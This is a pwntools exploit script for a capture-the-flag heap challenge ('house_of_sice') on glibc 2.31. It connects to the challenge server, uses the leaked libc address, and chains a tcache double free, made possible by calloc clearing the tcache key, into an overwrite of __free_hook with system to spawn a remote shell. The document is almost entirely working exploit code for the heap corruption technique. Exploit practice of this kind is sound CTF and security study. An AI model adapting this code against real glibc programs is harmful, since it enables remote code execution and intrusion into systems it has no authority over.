from pwn import *

#r = process("./house_of_sice", env={"LD_PRELOAD":"./libc-2.31.so"})
r = remote("house-of-sice.hsc.tf", 1337)
l = ELF("./libc-2.31.so", checksec=False)

def buy(kind, content):
    r.sendlineafter("> ", "1")
    r.sendlineafter("> ", str(kind))
    r.sendlineafter("> ", str(content))

def sell(idx):
    r.sendlineafter("> ", "2")
    r.sendlineafter("> ", str(idx))

# read given libc leak
r.recvuntil("complimentary deet:")
l.address = int(r.recvline(keepends=False), 16) - l.symbols["system"]
log.info("libc: " + hex(l.address))
one_gadget = l.address + 0xe6c7e

# malloc 9 chunks
for i in range(9):
    buy(1, 69) # 0 -> 8
# fill up tcache list
for i in range(7):
    sell(i)
# make 1 fastbin chunk
sell(7)
# malloc 2 tcaches
buy(1, 0x6873) # 9 ("sh")
buy(1, 2) # 10
# free the fastbin chunk as a tcache
sell(7)
# calloc will retrieve fastbin first instead of tcache, clearing the key
buy(2, 1337) # 11
# double free tcache
buy(1, 4) # dunno why it fucks up the heap so must insert this here
sell(11)

# classic __free_hook overwrite
buy(1, l.symbols["__free_hook"])
buy(1, 1337)
buy(1, l.symbols["system"])
sell(9)

r.interactive()
